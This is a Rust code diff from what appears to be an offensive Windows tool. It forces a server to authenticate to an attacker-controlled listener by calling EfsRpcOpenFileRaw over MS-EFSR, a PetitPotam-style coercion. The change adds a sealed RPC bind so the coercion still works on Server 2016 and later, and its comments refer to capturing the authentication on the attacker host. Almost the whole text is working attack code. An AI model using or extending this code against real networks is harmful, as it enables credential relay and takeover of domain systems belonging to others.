@@ -25,13 +25,25 @@ pub fn encode_open_file_raw(unc: &str) -> Vec<u8> {
 
 pub struct CoerceClient<'a> {
     pipe: SmbPipe<'a>,
+    sealed: bool,
 }
 
 impl<'a> CoerceClient<'a> {
-    pub async fn bind(client: &'a mut SmbClient, file_id: [u8; 16]) -> Result<Self> {
+    /// Sealed bind (RPC packet-privacy). MS-EFSR 3.1 mandates PKT_PRIVACY, and Server 2016+
+    /// enforces it — an unsealed bind reaches the server but every method call faults with
+    /// `nca_s_fault_ndr`. Pass the same credentials the SMB session was opened with.
+    pub async fn bind_sealed(
+        client: &'a mut SmbClient,
+        file_id: [u8; 16],
+        domain: &str,
+        user: &str,
+        password: &str,
+        host: &str,
+    ) -> Result<Self> {
         let mut pipe = SmbPipe::new(client, file_id);
-        pipe.bind(efsr_syntax()).await?;
-        Ok(CoerceClient { pipe })
+        pipe.bind_sealed(efsr_syntax(), domain, user, password, host)
+            .await?;
+        Ok(CoerceClient { pipe, sealed: true })
     }
 
     /// Fire EfsRpcOpenFileRaw at `\\listener\share\x`. Returns the EFSRPC status word — a
@@ -39,10 +51,15 @@ impl<'a> CoerceClient<'a> {
     /// capture requires a relay/listener on the attacker host (out of tool scope).
     pub async fn coerce(&mut self, listener: &str) -> Result<u32> {
         let unc = format!("\\\\{listener}\\share\\efsrpc.txt");
-        let resp = self
-            .pipe
-            .call(OPNUM_OPEN_FILE_RAW, &encode_open_file_raw(&unc))
-            .await?;
+        let resp = if self.sealed {
+            self.pipe
+                .call_sealed(OPNUM_OPEN_FILE_RAW, &encode_open_file_raw(&unc))
+                .await?
+        } else {
+            self.pipe
+                .call(OPNUM_OPEN_FILE_RAW, &encode_open_file_raw(&unc))
+                .await?
+        };
         // EfsRpcOpenFileRaw returns [out] handle (20) + NTSTATUS at the tail.
         let status = resp
             .len()
